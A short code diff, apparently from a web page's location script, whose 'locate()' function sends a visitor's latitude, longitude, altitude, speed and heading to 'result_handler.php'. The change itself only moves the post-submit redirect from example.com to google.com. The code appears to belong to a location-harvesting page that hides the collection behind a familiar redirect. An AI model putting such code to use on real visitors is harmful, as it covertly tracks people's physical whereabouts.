@@ -61,7 +61,7 @@ function locate()
       type: 'POST',
       url: 'result_handler.php',
       data: {Status: ok_status,Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){window.location='http://example.com';},
+      success: function(){window.location='https://google.com';},
       mimeType: 'text'
     });
   };
